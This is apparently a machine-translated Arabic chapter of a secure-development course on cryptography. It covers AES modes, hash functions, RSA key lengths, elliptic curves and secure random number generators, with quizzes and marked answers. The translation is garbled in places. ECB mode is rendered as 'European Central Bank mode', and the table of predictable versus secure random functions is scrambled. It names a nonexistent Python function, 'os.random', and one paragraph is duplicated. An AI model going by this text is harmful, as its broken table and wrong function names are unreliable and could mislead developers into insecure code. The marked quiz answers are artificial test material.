على سبيل المثال ، نريد عادة أن يكون لمتصفحات الويب وخوادم الويب الخاصة بنا اتصال مشفر بين بعضها البعض بحيث تكون المعلومات سرية عن الآخرين ، ولا يمكن تعديلها دون اكتشافها ، وحتى يكون لمتصفح الويب على الأقل ثقة عالية في أنه يتصل بخادم الويب الصحيح. تدير العديد من الأنظمة البيانات الحساسة مثل البيانات المالية وبيانات الرعاية الصحية ومعلومات التعريف الشخصية (PII). غالبا ما يكون التشفير جزءا مهما من حماية هذه البيانات بحيث لا يمكن قراءتها بسهولة أو تعديلها بشكل غير قابل للكشف من قبل الآخرين.

ومع ذلك ، هناك العديد من الأشخاص الذين يعرفون كيفية مهاجمة أنظمة التشفير. يمكن أن يؤدي استخدام التشفير بشكل غير صحيح في بعض الأحيان إلى وجود ثقة زائفة في نظام غير آمن. والأسوأ من ذلك ، قد يكون من الصعب أحيانا اكتشاف التشفير المستخدم بشكل غير صحيح إذا لم تكن خبيرا ، لذلك قد يتم استغلال هذه الأخطاء لفترات طويلة من الزمن.

بعض البلدان لديها قوانين ولوائح مختلفة بشأن التشفير ، وقد تغيرت على مر السنين. دعونا ننظر إلى الولايات المتحدة كمثال. تم تقييد تصدير تكنولوجيا وأجهزة التشفير من الولايات المتحدة بشدة حتى عام 1992. في الآونة الأخيرة ، طلبت الولايات المتحدة إشعارات البريد الإلكتروني للعديد من استخدامات تقنية التشفير. في عام 2021 ، تم تخفيف القاعدة الأمريكية بشكل أكبر ، بحيث تحتاج مشاريع البرامج مفتوحة المصدر فقط إلى تقديم إشعار إذا كانت تستخدم "تشفيرا غير قياسي". بشكل عام ، يجب عليك استخدام خوارزميات وبروتوكولات تشفير قياسية تم فحصها جيدا على أي حال ، لذلك بالنسبة للعديد من مشاريع البرامج مفتوحة المصدر ، فإن هذا يلغي متطلبات الإخطار عند التصدير من الولايات المتحدة. راجع [فهم مؤسسة Linux *لتكنولوجيا المصدر المفتوح وضوابط التصدير الأمريكية*](https://www.linuxfoundation.org/tools/understanding-us-export-controls-with-open-source-projects/) لمزيد من المعلومات. مناقشة لوائح التشفير في جميع أنحاء العالم خارج نطاق هذه الدورة.

 فشل التشفير هو 2021 OWASP Top 10 # 2. كان 2017 OWASP Top 10 # 3 ثم سمي التعرض للبيانات الحساسة. لا يحدث التعرض للبيانات الحساسة دائما بسبب سوء استخدام التشفير ، ولكنه سبب أساسي شائع. 2021 CWE Top 25 # 35 هو نقل النص الواضح للمعلومات الحساسة ([CWE-319](https://cwe.mitre.org/data/definitions/319.html)). * تعد قوة التشفير غير الكافية* سببا شائعا للثغرات الأمنية في حد ذاتها لدرجة أنها 2019 CWE Top 25 # 3 (وهي CWE-326[](https://cwe.mitre.org/data/definitions/326.html)).

لتطوير البرامج العادية ، هناك ثلاث قواعد أساسية للتشفير:

1. **_لا تقم أبدا_ بتطوير خوارزمية أو بروتوكول التشفير الخاص بك**.<br> إنشاء هذه متخصصة للغاية. للقيام بعمل جيد ، تحتاج إلى درجة الدكتوراه في التشفير ، والتي بدورها تتطلب رياضيات جامعية متقدمة. بدلا من ذلك ، اكتشف ما تم فحصه علنا من قبل مصممي التشفير ذوي السمعة الطيبة واستخدمه.

2. **_لا تقم أبدا_ بتنفيذ خوارزميات أو بروتوكولات التشفير الخاصة بك (إذا كان لديك بديل).**<br> هناك عدد كبير من القواعد المتخصصة لتنفيذ خوارزميات التشفير التي لا تنطبق على البرامج العادية وبالتالي فهي غير معروفة لمعظم مطوري البرامج. غالبا ما تصبح أخطاء التنفيذ الصغيرة لخوارزميات التشفير نقاط ضعف هائلة. بدلا من ذلك ، أعد استخدام التطبيقات الجيدة حيثما كان ذلك عمليا.

3. ** أنظمة التشفير (مثل الخوارزميات والبروتوكولات) معطلة أحيانا.** <br>تأكد من أن الأنظمة التي تختارها لا تزال قوية بما فيه الكفاية ، وتأكد من استعدادك لاستبدالها.

عند اختيار مكتبة تشفير ، تفضل تلك التي خضعت لمراجعة عامة كبيرة ولديها واجهة برمجة تطبيقات سهلة الاستخدام بشكل صحيح. خلاف ذلك ، فإنك تخاطر بوجود ثغرة أمنية إما في المكون المعاد استخدامه أو وجود ثغرة بسبب الاستخدام غير الصحيح لواجهة برمجة التطبيقات.

يبحث محللو التشفير دائما عن طرق لكسر خوارزميات التشفير ، ويعمل مصممو التشفير دائما على مواجهة تلك الهجمات. تاريخيا ، يتم تطوير خوارزميات التشفير ، وتستمر لفترة من الوقت ، ثم يتم كسرها أخيرا بسبب بعض الهجوم. لذا قبل اختيار أي شيء في التشفير ، قم ببعض عمليات البحث للتأكد من أن ما تختاره ليس ضعيفا أو مكسورا. ربما لم يتم كسر أي شيء مؤخرا ... ولكن ليس من الحكمة افتراض ذلك.

ستحدد الأقسام التالية بعض الخوارزميات والبروتوكولات الرئيسية وبعض المؤشرات عنها.

### خوارزميات تشفير المفاتيح المتماثلة / المشتركة

 * يأخذ المفتاح المتماثل* أو  خوارزمية تشفير *المفتاح المشترك* البيانات (تسمى "نص واضح") ومفتاحا كمدخلات ، وينتج بيانات مشفرة (تسمى "نص مشفر"). يمكن أن يذهب أيضا في الاتجاه الآخر: باستخدام النص المشفر ونفس المفتاح ، يمكنه إنتاج النص الواضح المقابل.

المهم في خوارزميات تشفير المفتاح المتماثل هو استخدام *نفس* المفتاح لتشفير البيانات وفك تشفيرها. لذلك إذا كنت تريد أن يتمكن الأشخاص من فك تشفير بعض النصوص المشفرة المشفرة بهذه الطريقة ، فعليك الترتيب لهم للحصول على المفتاح. معظم خوارزميات المفاتيح المتماثلة الحديثة سريعة للغاية (غالبا ما يتم تسريعها بواسطة الأجهزة) ، وتشكل أساس العديد من أنظمة التشفير.

#### اختيار خوارزمية مفتاح متماثل

في وقت كتابة هذا التقرير (2020) ، كانت خوارزمية المفتاح المتماثل الأكثر شيوعا هي معيار التشفير المتقدم (AES). يدعم AES 3 أحجام مفاتيح: 128 أو 192 أو 256 بت ؛ تكون أحجام المفاتيح الأطول أقوى ضد الهجوم ، ولكنها تستغرق وقتا أطول للتنفيذ. في وقت كتابة هذا التقرير ، حتى 128 بت تعتبر آمنة بشكل كاف لمعظم الأغراض ، ولكن تحقق لمعرفة ما إذا كان هناك شيء قد تغير. AES سريع للغاية. تم تصميمه ليكون سريعا على المعالجات الحديثة ، والعديد من المعالجات لديها آليات تسرعه أكثر.

هناك خوارزميات مفاتيح متماثلة تاريخية أخرى تعتبر *غير آمنة* لحالات الاستخدام النموذجية اليوم:

* DES: طول المفتاح 56 بت قصير جدا بحيث لا يمكن تأمينه اليوم.

* RC4: تم العثور على العديد من نقاط الضعف في RC4 ، وتعتبر بشكل عام غير آمنة.

* 3DES: داخليا ، يبلغ حجم الكتلة 64 بت فقط. تكون الخوارزميات ذات أحجام الكتل الصغيرة عرضة لهجوم يسمى *هجوم عيد الميلاد* إذا تم استخدامها لتشفير كميات كبيرة من البيانات بنفس المفتاح.

* السمكة المنتفخة: يحتوي هذا أيضا على حجم كتلة يبلغ 64 بت فقط ، وبالتالي لديه نفس مشاكل 3DES.

هناك خوارزميات مفاتيح متماثلة بديلة تعتبر أيضا آمنة بشكل عام. على سبيل المثال ، كان TwoFish من المتأهلين للتصفيات النهائية في المسابقة التي أدت إلى AES ، وفي وقت كتابة هذا التقرير لم يكن لديه نقاط ضعف عملية معروفة.

#### اختيار الوضع

العديد من خوارزميات المفاتيح المتماثلة ، بما في ذلك AES ، هي ما يسمى خوارزميات الكتلة**. باستخدام خوارزميات الكتلة ، يجب عليك أيضا اختيار *وضع* لاستخدامه. فيما يلي أهم قاعدة حول الأوضاع:

**لا تستخدم أبدا وضع كتاب الكود الإلكتروني (ECB)!**

وضع البنك المركزي الأوروبي هو في الأساس وضع تصحيح أو اختبار لاختبار خوارزميات التشفير. في وضع البنك المركزي الأوروبي ، ستنتج نفس كتلة البيانات نفس نتيجة التشفير. هذا أمر كارثي بالنسبة لخوارزمية التشفير ، لأنه يكشف الكثير عن البيانات التي من المفترض أن تكون مشفرة. مثال رائع على ذلك هو ما يسمى صورة "البطريق المركزي الأوروبي". يتم تشفير هذه الصورة باستخدام وضع البنك المركزي الأوروبي. يجب أن تظهر الصور المشفرة كضوضاء عشوائية ، ولكن نظرا لاستخدام وضع ECB ، في ECB Penguin تكون صورة Tux the Penguin مرئية بوضوح.

![البطريق ECB: صورة مشفرة داكنة تظهر بوضوح تميمة Linux ، Tux the Penguin](ecb_penguin.png)

تم استرداد البطريق ECB ، بقلم فيليبو فالسوردا ، من [filippo.io](https://blog.filippo.io/the-ecb-penguin/). مرخص بموجب [CC BY-SA 4.0 الدولية.](https://creativecommons.org/licenses/by/4.0/legalcode) هذه الصورة مستوحاة من صورة ECB Penguin الأصلية منخفضة الدقة بواسطة مستخدم ويكيبيديا: Lunkwill. المصدر "البطريق البنك المركزي الأوروبي" (2013-11-10). استنادا إلى Tux ، تميمة Linux الرسمية للبطريق التي أنشأها Larry Ewing في عام 1996

تاريخيا  ، تم استخدام وضع *تسلسل كتلة التشفير* (CBC) ، ولكن يجب حساب ذلك بالتتابع ، لذلك فهو بطيء في الأنظمة متعددة النواة. مشكلة أخرى هي أن العديد من الأنظمة التي تستخدم CBC عرضة للهجمات ما لم يتم التحقق من سلامتها أولا. لذلك بشكل عام ، من الأفضل تجنب وضع CBC اليوم ([وثائق Microsoft CBC ](https://docs.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode)، 2020).

الوضع الشائع المستخدم اليوم هو وضع Galois / Counter (GCM). إنه سريع وقابل للتوازي ويضيف رمز مصادقة حتى يتمكن بسهولة من اكتشاف ما إذا كان المفتاح الخطأ مستخدما. إنه وضع جيد للاستخدام. هناك أوضاع جيدة أخرى أيضا. الشيء المهم هو اختيار الوضع بحكمة ، وعلى وجه الخصوص ، عدم ** استخدام وضع البنك المركزي الأوروبي في أنظمة الإنتاج.

#### اختبار 3.1: خوارزميات تشفير المفاتيح المتماثلة / المشتركة

\>\>حدد العبارة (العبارات) الحقيقية:<<

[!x] يدعم معيار التشفير المتقدم (AES) 3 أحجام مفاتيح: 128 أو 192 أو 256 بت.

[ ] Triple-DES (3DES) هي خوارزمية تشفير آمنة لاستخدامها لكميات كبيرة من البيانات. {{ محدد: هذا غير صحيح. يحتوي برنامج 3DES على حجم كتلة داخلي يبلغ 64 بت فقط ، وهذا يجعله عرضة ل "هجوم عيد ميلاد" إذا تم تشفير كميات كبيرة من البيانات بنفس المفتاح. يعد برنامج 3DES أفضل بكثير من DES في حد ذاته ، نظرا لأن 3DES له حجم مفتاح أطول ، ولكن يجب عليك عادة استخدام شيء آخر مثل AES حيث يمكنك. }}

[ ] يجب عليك استخدام وضع كتاب الرموز الإلكتروني (ECB) لخوارزميات التشفير ، لأن ذلك يتيح إمكانية التكاثر.

[x] الوضع الشائع والجيد بشكل عام للاختيار هو Galois / Counter Mode (GCM).

### تجزئات التشفير (بصمات الأصابع الرقمية)

تحتاج بعض البرامج إلى خوارزمية تجزئة تشفير أحادية الاتجاه ، أي وظيفة تأخذ  كمية *عشوائية* من البيانات وتولد رقما ثابتا الطول بخصائص خاصة. الخصائص الخاصة هي أنه يجب أن يكون من غير المجدي للمهاجم إنشاء:

1. رسالة أخرى بقيمة تجزئة معينة (*مقاومة الصورة المسبقة*)

2. رسالة أخرى (معدلة) بنفس تجزئة الرسالة الأولى (*مقاومة الصورة المسبقة الثانية*)

3. أي رسالتين بنفس التجزئة (*مقاومة الاصطدام*).

الفكرة هي أنه يمكنك تمثيل كمية عشوائية من البيانات بقيمة أصغر ذات طول ثابت. إنها "*أحادية الاتجاه*" بمعنى أنه لا يمكنك بشكل عام إعادة إنشاء البيانات الأصلية نظرا لقيمة التجزئة فقط. تعتبر تجزئات التشفير مفيدة في حد ذاتها ، وغالبا ما تستخدم أيضا كجزء من أنظمة تشفير أكبر.

يجب تجنب الخوارزميات MD4 و MD5 و SHA-0 ، حيث من المعروف أنها مكسورة.

تستخدم عائلة SHA-2 (بما في ذلك SHA-256 و SHA-512) وخوارزمية SHA-3 على نطاق واسع وتعتبر آمنة بشكل عام في وقت كتابة هذا التقرير. كانت هناك مخاوف بشأن عائلة SHA-2 ، مما أدى إلى تطوير SHA-3 ، ولكن حتى كتابة هذه السطور لم يتم الإبلاغ علنا عن كسر كامل ل SHA-2.

خوارزمية SHA-1 هي حالة أكثر تعقيدا قليلا. يجب ألا تستخدمه في الأنظمة الجديدة ، ويجب أن تبتعد عنه على الفور إذا كنت تستخدمه حاليا. أوقف NIST SHA-1 في عام 2011 لأنه مكسور بشكل أساسي ، بمعنى أن SHA-1 لم يعد يفي بتعريف تجزئة التشفير. في معظم الحالات ، لا توجد مشكلة في التبديل من SHA-1 إلى SHA-2 أو SHA-3.

ومع ذلك ، فإن إحدى المشكلات المزعجة هي أن أداة git المستخدمة على نطاق واسع (كما تم تطويرها في الأصل) تعتمد بشكل أساسي على SHA-1. لا تهم الفواصل المعروفة حاليا في SHA-1 المواقف الشائعة. بالإضافة إلى ذلك ، اعتبارا من عام 2020 ، يستخدم git متغيرا صلبا من SHA-1 يقاوم المشاكل الرئيسية مع SHA-1 حيث يتم استخدامه داخل git. ومع ذلك ، فإن الهجمات تصبح أقوى فقط ، وليس أضعف ، مما يؤدي إلى العديد من المخاوف بشأن استخدام SHA-1 في git.

حتى كتابة هذه السطور ، هناك جهد لتحديث git بحيث يدعم خوارزمية تجزئة تشفير مختلفة ، وتحديدا SHA-256. كان هذا معقدا لأن git لم يتم تصميمه في الأصل لدعم خوارزمية تجزئة تشفير أخرى (خوارزمية تجزئة [جديدة ل Git ، ](https://lwn.net/Articles/811068/)بقلم جوناثان كوربيت ، 2020). كما هو مذكور في LWN.net ، *"أحد الأسباب التي جعلت هذا الانتقال صعبا للغاية هو أن تطبيق Git الأصلي لم يكن مصمما لمبادلة خوارزميات التجزئة. كان الكثير من العمل [تنفيذ SHA-256 في بوابة] يتراجع عن هذا العيب الأولي في التصميم [لجعل] Git غير مبال بشكل أساسي بخوارزمية التجزئة المستخدمة. هذا [عمل] من شأنه أن يجعل Git أكثر قابلية للتكيف في المستقبل إذا ظهرت الحاجة إلى استبدال SHA-256 بشيء أقوى "(تحديث بروتوكول Git ل SHA-256*  ، [بقلم John Coggeshall ، 2020).](https://lwn.net/Articles/823352/)

قد يتم حل هذا في git بحلول الوقت الذي تقرأ فيه هذا. ومع ذلك ، فإن النقطة الرئيسية هي التعلم من هذا الخطأ. كما ذكرنا سابقا ، يتم كسر أنظمة التشفير (مثل الخوارزميات والبروتوكولات) ** أحيانا ، لذلك يجب أن تكون مستعدا لاستبدالها.

#### اختبار 3.2: تجزئات التشفير (بصمات الأصابع الرقمية)

\>\>حدد العبارة (العبارات) الحقيقية:<<

[!x] في خوارزمية تجزئة تشفير آمنة أحادية الاتجاه ، يجب أن يكون من غير الممكن ، بالنظر إلى رسالة واحدة ، إنشاء رسالة أخرى لها نفس قيمة التجزئة {{ محدد: هذا صحيح ، هذه "مقاومة ما قبل الصورة" }}

[x] لم يعد SHA-1 يفي بالمعايير الكاملة لدالة تجزئة التشفير أحادية الاتجاه ، لذلك بشكل عام يجب عليك الانتقال إلى خوارزمية أخرى ، مثل عائلة SHA-2 أو SHA-3.

[x] تقبل دالة تجزئة التشفير كمية عشوائية من البيانات وتنتج قيمة بطول ثابت يمثل بيانات الإدخال.

### تشفير المفتاح العام (غير المتماثل)

يستخدم المفتاح العام أو نظام التشفير غير المتماثل أزواجا من المفاتيح. مفتاح واحد * هو مفتاح خاص* (معروف فقط لمالكه) والآخر هو *مفتاح عام* (يمكن توزيعه علنا). ترتبط المفاتيح ولكنها تلعب أدوارا مختلفة ، ولهذا السبب غالبا ما تسمى التشفير *غير المتماثل*. من الضروري في هذه الأنظمة الحفاظ على خصوصية المفتاح الخاص.

يمكن استخدام هذه الخوارزميات بطريقة واحدة أو أكثر (اعتمادا على الخوارزمية) ، بما في ذلك:

* **التشفير**<br>يمكن لأي شخص تشفير رسالة باستخدام مفتاح عام ، ولكن فقط شخص لديه المفتاح الخاص المقابل يمكنه فك تشفيرها. عادة ما تكون خوارزميات تشفير المفتاح العام بطيئة نسبيا ، لذلك في العديد من المواقف  ، يتم تشفير *مفتاح* لخوارزمية المفتاح المشترك ، ويتم تشفير بقية الرسالة بمفتاح مشترك.

* **التوقيعات الرقمية (المصادقة)**<br> يمكن للمرسل استخدام خوارزمية المفتاح العام ومفتاحه الخاص لتوفير بيانات إضافية تسمى *التوقيع الرقمي*؛ يمكن لأي شخص لديه المفتاح العام التحقق من أن المرسل يحمل المفتاح الخاص المقابل.

* **تبادل المفاتيح**<br>هناك خوارزميات المفتاح العام التي تمكن طرفين من الحصول على مفتاح مشترك دون أن يتمكن المراقبون السلبيون الخارجيون من تحديد المفتاح.

خوارزمية المفتاح العام المستخدمة على نطاق واسع هي خوارزمية RSA ، والتي *يمكن* استخدامها لجميع هذه الأغراض. ومع ذلك ، *لا تنفذ RSA بنفسك*. يعتمد RSA بشكل أساسي على أس أعداد كبيرة ، مما يجذب بعض المطورين إلى تنفيذه بأنفسهم أو التفكير في أنه بسيط. من الناحية العملية ، من السهل للغاية تنفيذ RSA *بشكل غير آمن*. على سبيل المثال ، من الصعب جدا التحقق من المعلمات الضعيفة التي *تبدو* مقبولة ولكنها تجعل هزيمتها تافهة. لكي تكون آمنا ، *يجب* تنفيذ RSA  بشيء يسمى "الحشو". هناك مخطط حشو RSA قياسي مع دليل صارم يسمى OAEP ، ولكن من الصعب تنفيذه بشكل صحيح (قد تكون التطبيقات غير الصحيحة عرضة لهجوم *Manger*). من الناحية العملية ، قد يكون تطبيق RSA صعبا بشكل صحيح ، وما لم تفهم التشفير ، فلن تتمكن من معرفة متى لا يعمل ([*على محمل الجد ، توقف عن استخدام RSA ،*](https://blog.trailofbits.com/2019/07/08/fuck-rsa/) 2019).

يجب أن تكون أطوال مفاتيح RSA أطول مما قد تتوقع. طول مفتاح RSA البالغ 1024 بت يعادل تقريبا طول مفتاح متماثل يبلغ 80 بت ، وهو صغير جدا بحيث يعتبر غير آمن بشكل عام. طول مفتاح RSA البالغ 2048 بت يعادل طول مفتاح متماثل يبلغ 112 بت ؛ يعتبر 2048 بت مقبولا بالكاد من قبل البعض (على سبيل المثال ، يقول NIST أنه يمكن استخدام هذا حتى عام 2030 ، وبعد ذلك قد لا تستخدمه حكومة الولايات المتحدة). إذا كنت تستخدم RSA ، فمن المحتمل أن تستخدم مفتاح 3072 بت على الأقل في عمليات النشر الحالية (وهذا يعادل مفتاح متماثل 128 بت). ستحتاج إلى مفتاح RSA من 15,360 بت للحصول على ما يعادل مفتاح متماثل 256 بت. راجع  توصية [NIST *لإدارة المفاتيح: الجزء 1 - عام*](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf) لمزيد من المعلومات حول الأطوال المكافئة للمفتاح. لسوء الحظ ، فإن RSA بطيء نسبيا ، خاصة عندما تزيد إلى أطوال المفاتيح اللازمة للحد الأدنى من الأمان. لكل هذه الأسباب ، توصي بعض المؤسسات ، مثل Trail of Bits ، بتجنب استخدام RSA في معظم الحالات ([*على محمل الجد ، توقف عن استخدام RSA ،*](https://blog.trailofbits.com/2019/07/08/fuck-rsa/) 2019).

تسمى عائلة كاملة من  الخوارزميات *تشفير المنحنى الإهليلجي* ؛ هذه هي الخوارزميات التي تستند إلى الرياضيات المعقدة التي تنطوي على منحنيات إهليلجية. تتطلب هذه الخوارزميات أطوال مفاتيح أقصر بكثير لقوة تشفير مكافئة ، وهذه ميزة كبيرة. تاريخيا ، تضمن تشفير المنحنى الإهليلجي حقل ألغام من براءات الاختراع ، ولكن على مر السنين انتهت صلاحية العديد من براءات الاختراع هذه وبالتالي أصبح تشفير المنحنى الإهليلجي أكثر شيوعا. خوارزمية مستخدمة على نطاق واسع ومحترمة لتبادل المفاتيح والتوقيعات الرقمية هي Curve25519. يجمع بروتوكول ذو صلة يسمى ECIES بين تبادل مفاتيح Curve25519 وخوارزمية مفتاح متماثل (لمزيد من التفاصيل ، راجع [*بجدية ، توقف عن استخدام RSA ،*](https://blog.trailofbits.com/2019/07/08/fuck-rsa/) 2019).

يعد معيار التوقيع الرقمي (DSS) معيارا لإنشاء توقيعات رقمية مشفرة. وهو يدعم العديد من الخوارزميات الأساسية: خوارزمية التوقيع الرقمي (DSA) ، وخوارزمية التوقيع الرقمي RSA ، وخوارزمية التوقيع الرقمي للمنحنى الإهليلجي (ECDSA).

هناك أيضا مجموعة متنوعة من خوارزميات تبادل المفاتيح. الأقدم هو خوارزمية تبادل مفاتيح Diffie-Hellman. هناك خوارزمية أحدث لتبادل المفاتيح تعتمد على المنحنيات الإهليلجية ، تسمى المنحنى الإهليلجي Diffie-Hellman (ECDH).

كما أشرنا سابقا ، من الأهمية بمكان أن تستخدم التطبيقات الحالية المحترمة (لا تنفذها بنفسك) ، وتحقق من أي معلمات تختارها بعناية. ربما يكون الأهم هو طول المفتاح لتلك الخوارزمية (كما ذكرنا سابقا ، تتمتع خوارزميات المنحنى الإهليلجي بقوة مكافئة مع مفاتيح أقصر). مصدر مفيد لأطوال المفاتيح الموصى بها هو  توصية [NIST *لإدارة المفاتيح: الجزء 1 - عام*](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf).

#### اختبار 3.3: تشفير المفتاح العام (غير المتماثل)

\>\>حدد العبارة (العبارات) الحقيقية:<<

[!] يعتبر RSA مع مفتاح 1024 بت آمنا بشكل عام بشكل كاف لمعظم حالات الاستخدام.

[ ] RSA هو في الأساس أس ، لذلك للحد من التبعيات ، غالبا ما يكون من الأفضل إعادة تنفيذه داخل نظام أكبر.

[x] Curve25519 هي خوارزمية مستخدمة على نطاق واسع وتعتبر آمنة بشكل عام.

### مولد الأرقام العشوائية الزائفة الآمن بشكل مشفر (CSPRNG)

تعتمد العديد من الخوارزميات على قيم سرية لا يمكن تخمينها عمليا من قبل المهاجم ، ويعرف أيضا باسم "آمن بشكل مشفر". يتضمن ذلك القيم المستخدمة بواسطة خوارزميات التشفير (مثل المفاتيح الخاصة و nonces) ومعرفات الجلسة والعديد من القيم الأخرى. إذا تمكن المهاجم من تخمين قيمة ، بما في ذلك القيم السابقة أو المستقبلية ، فإن العديد من الأنظمة تصبح غير آمنة.

أحد التحديات تاريخي: اليوم ، يشير الاسم *العشوائي* في مكتبات لغات البرمجة عادة إلى أن الوظيفة *ليست* آمنة من الناحية المشفرة. كان أحد الاستخدامات الأولى لأجهزة الكمبيوتر الرقمية هو تنفيذ عمليات المحاكاة (خاصة *محاكاة مونت كارلو*) حيث تم الحصول على أرقام عشوائية بشكل متكرر للمحاكاة. كان من المهم في كثير من الأحيان أن تكون قادرا على *إعادة بناء* هذه الأرقام العشوائية حتى يمكن تكرار التجارب. داخليا ، سيتم تنفيذ هذه الوظائف العشوائية باستخدام خوارزميات مثل مولد التطابق الخطي (LCG) ، وغالبا ما يتم "تصنيفها" (تهيئتها) بواسطة قيم مثل التاريخ / الوقت الذي يمكن تخمينه بشكل تافه من قبل المهاجم. نظرا لأن هذا كان أحد الاستخدامات الأولى لأجهزة الكمبيوتر ، فهناك اتفاقية عبر جميع لغات البرمجة تقريبا تشير كلمة "عشوائي" إلى طريقة لإنشاء سلسلة من الأرقام التي يمكن إعادة بنائها بسهولة لاحقا إذا لزم الأمر. بمعنى آخر ، تشير كلمة "عشوائي" في لغات البرمجة عادة إلى "*عشوائية متوقعة*" ، وهذا ليس ما تريده في التشفير أو الأمان. *يجب عدم* استخدام هذه الأرقام العشوائية  لآليات الأمان حيث يكون من المهم ألا يتمكن المهاجم من ** تحديد الرقم.

![في هذا الشكل ، يتم تنفيذ getRandomNumber عن طريق إرجاع الثابت 4 ، وهو رقم تم اختياره بواسطة لفة النرد العادلة ويزعم أنه مضمون أن يكون عشوائيا.](random_number.png)

**رقم عشوائي ، **تم استرداده من [xkcd.com](https://xkcd.com/221) ، مرخص بموجب [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/)

بدلا من ذلك ، بالنسبة للتشفير  والمهام المتعلقة بالأمان ، تحتاج إلى استخدام [مولد أرقام عشوائية زائفة آمن بشكل مشفر (CSPRNG)](https://en.wikipedia.org/wiki/Cryptographically-secure_pseudorandom_number_generator) للتشفير والمهام المتعلقة بالأمان. بعبارة أخرى ، هناك العديد من خوارزميات وتطبيقات مولد الأرقام العشوائية الزائفة (PRNG) ، ولكن من أجل الأمان ، يجب عليك *فقط* استخدام PRNGs الآمنة بشكل مشفر (CSPRNGs). يمنع CSPRNG الجيد عمليا التنبؤ بالمخرجات التالية بالنظر إلى المخرجات السابقة (في فرصة أكبر من عشوائية) كما يمنع الكشف عن المخرجات السابقة إذا تعرضت حالتها الداخلية للخطر. تسمى CSPRNGs أيضا PRNGs المشفرة (CPRNGs). عادة ما يحتوي اسم تطبيق CSPRNG على "آمن" و / أو "تشفير". في وثائقهم ، قد ترى إشارات إلى خوارزميات CSPRNG المقبولة جيدا مثل Yarrow و Fortuna و ANSI X9.17 (والتي يمكنها استخدام أي تشفير كتلة) و NIST SP 800-90A Hash_DRBG و HMAC_DRBG و CTR_DRBG.

** لا تستخدم الخوارزمية أبدا Dual_EC_DRBG ، حيث من المقبول على نطاق واسع أن هذه خوارزمية مخربة وغير آمنة.**

فيما يلي بعض الأمثلة على كيفية استدعاء PRNG الذي يمكن التنبؤ به مقابل PRNG الآمن بالتشفير بلغات برمجة مختلفة (في الممارسة العملية ، غالبا ما تكون هناك طرق متعددة ؛ الهدف هو إظهار أنها مختلفة):

<table>
  <tr>
    <td>اللغة</td>
    <td> قيمة عشوائية يمكن التنبؤ بها<br> (لا تستخدم للأمان) قيمة </td>
  <td>
    </td>
  </tr>عشوائية آمنة بشكل مشفر<tr>جافا<td>
    </td> عشوائية () SecureRandom ()<td>
  </td><td>
    </td>
    </tr>
    <tr>
   <td>C #</td>
     <td>System.Random</td>
    <td>System.Security.Cryptography. RandomNumberGenerator</td>
  </tr>
    <tr>
  <td>جافا سكريبت</td>
     Math.random<td>window.crypto.getRandomValues</td>أو crypto.randomBytes<td>
  <br>
    </td>
  </tr>بايثون<tr>
    <td>عشوائي</td>
    <td>os.random</td>
    <td></td>
  </tr>
</table>


التحدي الآخر هو أن البرمجيات حتمية بشكل أساسي. بالنظر إلى نفس المدخلات بالضبط ، يجب أن تنتج الخوارزمية المتسلسلة نفس المخرجات بالضبط. يجب ألا تقوم عادة ببذر (تهيئة) أي خوارزميات آمنة تشفير مباشرة ، حيث تقوم العديد من هذه المكتبات بتنفيذ البذر الآمن بنفسها. إذا كان يجب عليك زرعها (وهذه علامة سيئة) ، فتأكد من أن المهاجمين لا يمكنهم تخمين قيمة البذور. يقوم بعض الأشخاص بزرع خوارزميات PRNGs آمنة بشكل مشفر مع بيانات التاريخ / الوقت ، وهي نقطة ضعف ؛ في كثير من الحالات ، يمكن للمهاجمين بسهولة تخمين التاريخ / الأوقات المحتملة.

هناك حل بسيط: استخدم CSPRNG واستخدم الأجهزة لتوفير البيانات له بشكل صحيح. توفر معظم نواة نظام التشغيل اليوم أرقاما عشوائية آمنة بشكل مشفر من خلال جمع الضوضاء البيئية من أجهزة متعددة وتنفيذ CSPRNG. إذا كنت تعمل على المعدن العاري (بدلا من نواة نظام التشغيل) ، فعادة ما تكون هناك مكتبات قابلة لإعادة الاستخدام يمكنك استخدامها لهذا الغرض. يمكن استخدام هذه الأرقام العشوائية الآمنة المشفرة مباشرة ، أو يمكن استخدامها كبذور آمنة ل PRNG آمن مشفر.

على سبيل المثال ، توفر نواة Linux قيم أرقام عشوائية آمنة بشكل مشفر عبر `getrandom` استدعاء النظام الخاص بها ، بالإضافة إلى الملفات الخاصة `/dev/urandom` و `/dev/random`. في معظم الحالات ، قد ترغب في استخدام `getrandom` استدعاء النظام حيثما كان ذلك عمليا ، أو `/dev/urandom` الملف الخاص إذا كان `getrandom` من  الصعب الوصول إليه (على سبيل المثال ، من برنامج نصي shell). هذه تولد قيما عشوائية آمنة بشكل مشفر باستخدام CSPRNG والانتروبيا التي جمعتها النواة. في ظروف خاصة ، مثل إنشاء مفتاح تشفير طويل العمر ، قد ترغب بدلا من ذلك في استخدام `/dev/random` أو الخيار المكافئ في `getrandom`؛ هذا يجبر النواة على الانتظار (كتلة) حتى يكون لديها كمية تقديرية عالية من الإنتروبيا الداخلية. الغرض `/dev/random` من ذلك  هو التأكد من وجود كمية كبيرة من الإنتروبيا الداخلية ، ولكن قد يكون الحجب غير محدد في بعض الظروف وعادة ما يكون غير ضروري. المهم هو أن المهاجم لا يمكنه عمليا تخمين القيمة العشوائية ، وليس قيمة تقدير الإنتروبيا الداخلي هذا. (انظر  ["أساطير حول / ديف / عشوائي"](https://www.2uo.de/myths-about-urandom/) لتوماس). في المستقبل قد لا يكون هناك فرق بين `/dev/random` و `/dev/urandom`.

على سبيل المثال ، توفر نواة Linux قيم أرقام عشوائية آمنة بشكل مشفر عبر ** ملفها  الخاص / dev / **urandom ، وملفها الخاص / **dev / random** ، واستدعاء  نظام **getrandom** الخاص بها  . في معظم الحالات ، قد ترغب في استخدام ** الملف الخاص  / **dev / urandom أو استدعاء نظام **getrandom**. هذه تولد قيما عشوائية آمنة بشكل مشفر باستخدام CSPRNG والانتروبيا التي جمعتها النواة. في ظروف خاصة ، مثل إنشاء مفتاح تشفير طويل العمر ، قد ترغب بدلا من ذلك في استخدام  / **dev / random** أو الخيار المكافئ في **getrandom** ؛ هذا يجبر النواة على الانتظار (كتلة) حتى يكون لديها كمية تقديرية عالية من الإنتروبيا الداخلية. الغرض من  / **dev / random** هو التأكد من وجود إنتروبيا داخلية ، ولكن قد يكون الحظر غير محدد في بعض الظروف وعادة ما لا يكون ضروريا
